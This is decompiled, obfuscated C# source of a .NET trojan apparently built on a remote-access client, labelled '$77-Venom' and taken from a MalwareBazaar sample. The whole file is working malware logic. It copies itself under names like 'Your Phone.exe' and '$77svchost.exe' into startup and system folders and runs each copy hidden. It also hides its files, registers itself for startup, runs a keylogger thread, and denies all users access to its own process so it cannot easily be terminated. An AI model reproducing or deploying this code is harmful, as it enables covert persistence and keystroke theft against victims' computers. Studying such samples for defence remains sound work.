// Decompiled with JetBrains decompiler
// Type: ᮦⲓӅ뙹苳♭ᶬ롨塔鬪≄爥穳횼驸䉽괝涂ᙣ�
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.Utilities;

internal static class \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD
{
  public static \u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE \uFFFD獨ꦻ㖝텤ᑥ\u21AFٛ愱쮭꯴ꄌሚ㶓\u2BEB\u2472㓢咤\uEEED坋;
  private static ApplicationContext 윀葈Ⲙꉜ罨仞젭쒼櫃ᝒ邇ക\uFFFD\u23BB菗\u3193ꇪ視\uE901恺;

  [STAThread]
  private static void Main(string[] args)
  {
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(\u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.\uED7Dᶱ찍營畑쎼霝\u29A4쭒幸弋ٵ饱ᓞ裨槂礨趢箁\uFFFD);
    if (鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.Ŭꚑ抣欲闯䬇繖끐\uE2F9䁓紸\uA630骉뽠跴ᖕ\u21AC옟Ⳏῂ() && \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.\uE3B7\uFDD3\uAAD1㝤玑鞖\uFFFD\uEF47헫䯗\uF06A膾禇衾听ⵝ뻦龇䮜ಠ() && !\u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE.Exiting)
      \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.\uFFFD獨ꦻ㖝텤ᑥ\u21AFٛ愱쮭꯴ꄌሚ㶓\u2BEB\u2472㓢咤\uEEED坋.譏Ѱ伍\uFFFD\uF60F䜵\uEB85樾뚟\uECB8禗댙䰵謻鑊퓮옧偞神゙();
    䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.ᠷᏲꡐ긟䤔䂙\uE6E9붷챈ዱ\uED8B\u0CF3\uEE12㩛\uE9EB\u2530\uFFFD䖡㷨鲅();
    \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.나\uFE51䴭껦療\u31E5렊\u2772\u2E4F\uFFFD腤ꆝ\uFFFD\u250E\uFFFDఊ傼뿊읲\u25E2();
    \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.峝见紥辌\u0A77\uFFFD貺絈\uAAD1슧㭤㡱Պ鏻혡Ⲕ構縲\uE79A퍄();
    \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.實뷔敤\u3260糜ꤙ\uF455彘\uFFFDⳄ温磸翚\uFFFDࠗ稓\u09CA\u22F1\uE518琞();
  }

  private static void 實뷔敤\u3260糜ꤙ\uF455彘\uFFFDⳄ温磸翚\uFFFDࠗ稓\u09CA\u22F1\uE518琞()
  {
    if (\u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.윀葈Ⲙꉜ罨仞젭쒼櫃ᝒ邇ക\uFFFD\u23BB菗\u3193ꇪ視\uE901恺 != null || Application.MessageLoop)
      Application.Exit();
    else
      Environment.Exit(0);
  }

  private static void \uED7Dᶱ찍營畑쎼霝\u29A4쭒幸弋ٵ饱ᓞ裨槂礨趢箁\uFFFD(
    object sender,
    UnhandledExceptionEventArgs e)
  {
    if (!e.IsTerminating)
      return;
    string str = \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.嬘熨ൌ潨뀎邦詧\u171Cܹꇲ䵋웱斷ぬ⃩於姶㴓\uD92D\uDDA4();
    if (string.IsNullOrEmpty(str))
      return;
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      FileName = str
    });
    \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.實뷔敤\u3260糜ꤙ\uF455彘\uFFFDⳄ温磸翚\uFFFDࠗ稓\u09CA\u22F1\uE518琞();
  }

  private static void 峝见紥辌\u0A77\uFFFD貺絈\uAAD1슧㭤㡱Պ鏻혡Ⲕ構縲\uE79A퍄()
  {
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.틹ஃ\uF210\uF54D핧赝桕\u4DFFﻛ產㬙믡䃏횥倦\uECB0䌐ᾰ깃临();
    if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾 != null)
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.Dispose();
    if (Keylogger.Instance != null)
      Keylogger.Instance.Dispose();
    if (\u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.윀葈Ⲙꉜ罨仞젭쒼櫃ᝒ邇ക\uFFFD\u23BB菗\u3193ꇪ視\uE901恺 != null)
    {
      \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.윀葈Ⲙꉜ罨仞젭쒼櫃ᝒ邇ക\uFFFD\u23BB菗\u3193ꇪ視\uE901恺.ExitThread();
      \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.윀葈Ⲙꉜ罨仞젭쒼櫃ᝒ邇ക\uFFFD\u23BB菗\u3193ꇪ視\uE901恺.Dispose();
      \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.윀葈Ⲙꉜ罨仞젭쒼櫃ᝒ邇ക\uFFFD\u23BB菗\u3193ꇪ視\uE901恺 = (ApplicationContext) null;
    }
    瞎삆缊骎\u3284䫭\uAA3D词\uFFFD뱭胳䲿偸ꅟ賎圣鶱\uFFFD\uF470\uE9DA.掟\uA4CB톿庀㟯鄷뎩ﰈ瑸榆㰩鍁\uEC88\u33DEѶ\u28F5湪䴩恐딏();
  }

  private static bool \uE3B7\uFDD3\uAAD1㝤玑鞖\uFFFD\uEF47헫䯗\uF06A膾禇衾听ⵝ뻦龇䮜ಠ()
  {
    ઝ忧㷫\uFFC9挰螀ℬ䀖\uFFFD\uFFFD鑁眔ꤛ\uE4ADⰸ\uF35A\u2A08稏ᇙ䌅 hostsManager = new ઝ忧㷫\uFFC9挰螀ℬ䀖\uFFFD\uFFFD鑁眔ꤛ\uE4ADⰸ\uF35A\u2A08稏ᇙ䌅(䜗\uEC24ූ㕩뇛ü\u2962ꨬ\uEA05锆᪸믠젴ⴻ灁跥퓣徟\u268F\uE05F.\uFFFD召ͽ쒴\u2045晐ꥹ\u2D9A떳볽\uFFFD딥Ν噍䔦خ翴恤卂\u2395(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u24DB例殿\uFFFD\u2A46⁢瀏變Ẃ叶䚁䥂菄\uFFFDڏ渉龴糇\uEE12淁));
    if (!瞎삆缊骎\u3284䫭\uAA3D词\uFFFD뱭胳䲿偸ꅟ賎圣鶱\uFFFD\uF470\uE9DA.銃\uEF36㖿\uFFFD㳏擻됌\uE6EF勡᤺\u2870\u2BE4\u2E6FⰠ\uFFFD\uFE41딩괂㧩뗣(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.鶨硂ॎ\uE25DΆŒ\u29DD线\uF6FC㫙ᚸ줲瘳匊捀ቋ\uF605㤫\uFFFDᎈ) || hostsManager.IsEmpty || string.IsNullOrEmpty(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.結ك먀얆ⅳ\uEF2A\uF4CD誙\u2258靪㐮\u2E4D\u21CA枆匜뎩裈ﮟ\uF39D\uA4AE))
      return false;
    槦\uFFFD辺櫌\uEA69ɱ\uE127\uE010銃㡔臚\uAACE蒂ἄ鞷퀆\u2A62鲮䛱黖.鶙磵噇曁\u9FFF讆갈䕡\uE9DC縓\uF224偅彺ﺍꡇȖ賋\uFFFD퉮륈(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.籫\uE3D9댢䧶\u20E3螺\uFFFD\uED35砹ᤐ胩觉ޱ똌䭶\uF8B1킸\u0897鰻Ὸ, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.顗儢ж\uF02F\u2BBD㩨憖呰㚽㽜\uF4DE㖼\uE7A4ꐩ렓臻\u2F69뵑誣牛);
    ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath = Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, (!string.IsNullOrEmpty(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋) ? 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋ + "\\" : "") + 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.츓㥐\u2845킳આ熺ޛꫦ噔熋繱蕂盅᪵\uEB06渕\u2ACCⅩ͞ꛚ);
    \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.ᥧ澪矑\uF144晅ﴓ冮ೂ褳畺뚠궷\uEEF6秪彀Ⲧ掲焲幈ﲥ();
    \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.䏀녂\uF572馘熹\uE9C3瑊à妪ゲ㯝峰欓뒪\uE279ꆿ띙\uE576\uF857\uECFD(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.CurrentPath);
    if (!鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.伀鲉誡巤亡흺\u3288後禣꺲緀\uFFFD\uFFFD焇ꖴ\uE081䖘릉ꜵ퇑 || ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.CurrentPath == ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath)
    {
      햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.䒡ᩌ붘韔ା狾\uFFFD䰉갳硦ᴲꩳ걺愂軤랁૯䈺죙曪();
      if (鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.ਘ雭醉\u2270寜厏憔깱\uEF60\uF740䭃쾚끀䨲\uFFFD겦쫾\uF15Eઇﴟ && !ᎨΈt䤩\uFFFD誙硒ꥃ\uF451㙴\uE8AD\uE8CAʣ㪷ᢵथ曟뾨蕭\uFFFD.缚寺趾얋쪵譟ᷧ폠ꨴ㲨ﻥ쮂痩䑜뾩\u28CA糖逸縰\u0FDF())
        ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.AddToStartupFailed = true;
      if (鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.伀鲉誡巤亡흺\u3288後禣꺲緀\uFFFD\uFFFD焇ꖴ\uE081䖘릉ꜵ퇑)
      {
        if (鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.ꁝ뷚쎍䟤ꁟ訬埬殤物蟹ᅋ\uEC38\uEB06굴\u3385ꁃ뙽敕뱪걝)
        {
          try
          {
            File.SetAttributes(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.CurrentPath, FileAttributes.Hidden);
          }
          catch (Exception ex)
          {
          }
        }
      }
      if (鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.伀鲉誡巤亡흺\u3288後禣꺲緀\uFFFD\uFFFD焇ꖴ\uE081䖘릉ꜵ퇑 && 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.䞙ࠎ\uE969맳ǧ領欐Ⴠ\u2B19㛱墈\u2520\uF090龎섖굣땡\u2F4F\uF6E0\uE854)
      {
        if (!string.IsNullOrEmpty(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋))
        {
          try
          {
            new DirectoryInfo(Path.GetDirectoryName(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath)).Attributes |= FileAttributes.Hidden;
          }
          catch (Exception ex)
          {
          }
        }
      }
      if (鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u2009\u250A䞛㝴\uF4AF\uE934)
        new Thread((ThreadStart) (() =>
        {
          \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.윀葈Ⲙꉜ罨仞젭쒼櫃ᝒ邇ക\uFFFD\u23BB菗\u3193ꇪ視\uE901恺 = new ApplicationContext();
          Keylogger keylogger = new Keylogger(15000.0);
          Application.Run(\u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.윀葈Ⲙꉜ罨仞젭쒼櫃ᝒ邇ക\uFFFD\u23BB菗\u3193ꇪ視\uE901恺);
        }))
        {
          IsBackground = true
        }.Start();
      if (Convert.ToBoolean(ᱞ\uE235㩳왚Ꭵ癇\uE069룖\uE601\u33A3퇽믡\uF2B7䄙毾鄷꽮燝\u284B躥.\uE1F1稶ᜰ\uF27D\uFFFDꕃ㔂\uE6B6\u0DCB略롹멚䰄䞯囋升醬兓\uE281\uEF8D()))
        ᱞ\uE235㩳왚Ꭵ癇\uE069룖\uE601\u33A3퇽믡\uF2B7䄙毾鄷꽮燝\u284B躥.ꮬ\uF832蒩\u2A2Dﴀⶸ\uFFFD\u21E2퉇躽翭\uFFFD䲺䰧㹧\uAB19벵浥虜ᠱ();
      \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.\uFFFD獨ꦻ㖝텤ᑥ\u21AFٛ愱쮭꯴ꄌሚ㶓\u2BEB\u2472㓢咤\uEEED坋 = new \u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE(hostsManager);
      return true;
    }
    瞎삆缊骎\u3284䫭\uAA3D词\uFFFD뱭胳䲿偸ꅟ賎圣鶱\uFFFD\uF470\uE9DA.掟\uA4CB톿庀㟯鄷뎩ﰈ瑸榆㰩鍁\uEC88\u33DEѶ\u28F5湪䴩恐딏();
    람翖븠닽ᄳ\u2287峹\u4DFB嫥Ⰼ㛍䳽\uF74Cᳩ\uE825乙ꁅԭ艺㙱.㭒崦早ꈽ墄悫헱ᨍ錋꾱娭\uFFFD۟ဍ騈勯\u2BA3朕ﲃ勁((\u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ) \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.\uFFFD獨ꦻ㖝텤ᑥ\u21AFٛ愱쮭꯴ꄌሚ㶓\u2BEB\u2472㓢咤\uEEED坋);
    return false;
  }

  [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
  private static extern bool 䖏\u3300艹쳫㑟詶餵㪂㾃䬽Ζﶸ泪\u261D\u2684鱺馅節\uFFFD鶅(
    IntPtr Handle,
    int securityInformation,
    [Out] byte[] pSecurityDescriptor,
    uint nLength,
    out uint lpnLengthNeeded);

  public static RawSecurityDescriptor 滀쫁\uE061\u9FE6㿔责鯶㝴侢㫞䗜뻧鴱ᗭ蜳\uE032嘚沋\u322E\uFFFD(
    IntPtr processHandle)
  {
    byte[] pSecurityDescriptor = new byte[0];
    uint lpnLengthNeeded;
    \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.䖏\u3300艹쳫㑟詶餵㪂㾃䬽Ζﶸ泪\u261D\u2684鱺馅節\uFFFD鶅(processHandle, 4, pSecurityDescriptor, 0U, out lpnLengthNeeded);
    if (lpnLengthNeeded < 0U || lpnLengthNeeded > (uint) short.MaxValue)
      throw new Win32Exception();
    byte[] binaryForm;
    if (!\u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.䖏\u3300艹쳫㑟詶餵㪂㾃䬽Ζﶸ泪\u261D\u2684鱺馅節\uFFFD鶅(processHandle, 4, binaryForm = new byte[(int) lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
      throw new Win32Exception();
    return new RawSecurityDescriptor(binaryForm, 0);
  }

  [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
  private static extern bool \uFFFD罠픳풩濰\uF087抸虓뭦씛栕퍌䭁앹尨趋\uE707蹣ᇭ浗(
    IntPtr Handle,
    int securityInformation,
    [In] byte[] pSecurityDescriptor);

  public static void 溕謻韝\uFFFD뿡匼\uE3B1\uE86Aꢗ\u21FE딒\u326C냺熖眪ᡕ跣껥黑頂(
    IntPtr processHandle,
    RawSecurityDescriptor dacl)
  {
    byte[] numArray = new byte[dacl.BinaryLength];
    dacl.GetBinaryForm(numArray, 0);
    if (!\u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.\uFFFD罠픳풩濰\uF087抸虓뭦씛栕퍌䭁앹尨趋\uE707蹣ᇭ浗(processHandle, 4, numArray))
      throw new Win32Exception();
  }

  [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
  public static extern IntPtr ⶔ\uF4E7㧳듧퀽䒜刪ф鰬둼ₚ\u05CE馇\uFFFD\uFFFDቻ\uECA2픩\u1A5F遘();

  public static void 앗\uFFFD\uEFFF\uE883藞칫佳\uE145좧ᆙ阄ꑜ诵\u2A60\u2273廥ᛜꍦ慊炫()
  {
    IntPtr processHandle = \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.ⶔ\uF4E7㧳듧퀽䒜刪ф鰬둼ₚ\u05CE馇\uFFFD\uFFFDቻ\uECA2픩\u1A5F遘();
    RawSecurityDescriptor dacl = \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.滀쫁\uE061\u9FE6㿔责鯶㝴侢㫞䗜뻧鴱ᗭ蜳\uE032嘚沋\u322E\uFFFD(processHandle);
    dacl.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
    \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.溕謻韝\uFFFD뿡匼\uE3B1\uE86Aꢗ\u21FE딒\u326C냺熖眪ᡕ跣껥黑頂(processHandle, dacl);
  }

  public static void 나\uFE51䴭껦療\u31E5렊\u2772\u2E4F\uFFFD腤ꆝ\uFFFD\u250E\uFFFDఊ傼뿊읲\u25E2()
  {
    string destFileName1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "Your Phone.exe");
    File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName1);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName1
    });
    string destFileName2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Your Phone.exe");
    File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName2);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName2
    });
    string destFileName3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "$77Your Phone.exe");
    File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName3);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName3
    });
    string destFileName4 = "C:\\users\\public\\$77sys.exe";
    File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName4);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName4
    });
    string destFileName5 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "$77svchost.exe");
    File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName5);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName5
    });
    string destFileName6 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "$77svchost.exe");
    File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName6);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName6
    });
  }

  [System.Flags]
  public enum \uE2FF콂惝呮੫ފౚꓚᐭʍᮒ㢓힟\u32E4試蕰必\uE26C\u10C6蔷
  {
    羧狻\u243A\uFFFD緯涃\uFFFD竞\u249C߃꺂\uF5A9岿項ܝ\uE56F鎓\uFFFD삻榸 = 128, // 0x00000080
    뻛\uEB79㜼묠愧\uE9D8\uE661뜦땓隓쭉㿵\u246C퐊蛕Q㣲픬ꝫ馬 = 2,
    鵱㫧ᵭ簒鶖籚昝䣶\u2733႖Ԋ䴍헚䗏\u0BA6倣䩄ꠓ霢䡨 = 64, // 0x00000040
    \uFFFD頙晔윒噸\uE704趭粵\uE801ꐱ\uE98E휻詚㼼嘑靘濃품ꧥ\uFFFD = 1024, // 0x00000400
    弝촦驚Ꮨ葜虭\uE570疇佋ꃂ矐ல\uF5D4\uE33C苤ꙁ\u1AAF\u2BB8要쵮 = 4096, // 0x00001000
    늝\uEDB6綴\u22F3\uFFFD\u1AA9\uF1E7눞ഐ뺭죁鍼\uEA5F붠㑑喕벤꼯\uE737\uAA4F = 512, // 0x00000200
    ल\uF842㯨䘷\uE58F翛\uF54F䶊鶾嬫\uEBF8䐺\uE7C2\u17D9瑪简쌊仇ꪥ\u1CC7 = 256, // 0x00000100
    璻惟䬦\uE4A1쉗뀖촃䀠文圸ۺ逭̃㢩嘉짛㴘宻\uFFFD됗 = 2048, // 0x00000800
    \u00AEॠ\u28EB䨡倒\u2814\uEEBA\u2968履찙ዃ㺕Ḹ抽쵢\u24A1\uFFFD搌븠컨 = 1,
    \u0040\uFFFDО\uA63C猁摡鲧贯ර좣ꂰ녘며㲯갋輴ꀽ\uEE67훵젿 = 8,
    뒁ァ첌㻢괗丫ꝓ䑴㴣绘殡䋝睱ಔ䁑\uFFFDⲿ䠐䲜꺄 = 16, // 0x00000010
    䕐弶挮䎶၃춾\uEE3F搜㨕摤ꚅ\u2A11\u2B0E䤆鷤틼ힶ䴄т\uE9B0 = 32, // 0x00000020
    欥\u32D0琪Ṧ莞䭇袩㹬\uE2F5맇ꇨṲᗠ䁪\u250B\u338F콛卲ꀊⰃ = 65536, // 0x00010000
    駑ꚣῸ䂬腈ⷜ鉷珛믈रﮪ켭倰\u28A6\uE883ϫࠕ䬜ぅ\uE1CD = 131072, // 0x00020000
    ꏰ㟕䑢릻䒎䊶튂졸ꄢㅮ훐㟣轙稥퀛퐇ঢ\u27FEꃈ좣 = 1048576, // 0x00100000
    \u035Aᗼ띧궨穛ණ䛄\u2318腥ዔ\uE62B쌉蔔芔컁ﲷ緝퀊ㆺ嗅 = 262144, // 0x00040000
    \uE5C5䌐닠厠\uEC0D㟾\uE2C7ꯝ\uFFFD䪎\uF01Bﰡ胋울虁\uEAE5\u0FCCⴲ\uA630瞻 = 524288, // 0x00080000
    濷\u2388괜䅽\uEEBB\u17EC狓\uA4B8௩ᎆ䉽盾\uED60겫鬎짠\uF61Cᵱﰇ漤 = \uE5C5䌐닠厠\uEC0D㟾\uE2C7ꯝ\uFFFD䪎\uF01Bﰡ胋울虁\uEAE5\u0FCCⴲ\uA630瞻 | \u035Aᗼ띧궨穛ණ䛄\u2318腥ዔ\uE62B쌉蔔芔컁ﲷ緝퀊ㆺ嗅 | 駑ꚣῸ䂬腈ⷜ鉷珛믈रﮪ켭倰\u28A6\uE883ϫࠕ䬜ぅ\uE1CD | 欥\u32D0琪Ṧ莞䭇袩㹬\uE2F5맇ꇨṲᗠ䁪\u250B\u338F콛卲ꀊⰃ, // 0x000F0000
    \uFFFD弁\uE19D唊\uEE69\uE4C0\uE8F4ﱵ贾牐\uF79C튟䧚㤠퀜ᇶꉞꀾ本ู = 2035711, // 0x001F0FFF
  }
}
